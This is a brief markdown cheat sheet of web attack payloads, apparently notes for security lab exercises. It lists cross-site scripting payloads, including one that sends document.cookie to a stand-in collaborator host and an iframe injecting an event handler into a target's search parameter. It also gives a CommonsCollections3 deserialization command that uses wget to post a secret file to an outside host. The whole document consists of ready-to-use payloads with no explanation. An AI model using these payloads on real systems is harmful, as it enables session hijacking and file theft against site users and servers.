## XSS Delivery
```
<script>
location = "http://exampleurl"
</script>

<script>document.location='https://COLLABORATOR.com/?domxss='+document.cookie</script>

<iframe src="https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
```

## Deserialization Delivery
```
CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secret'
```
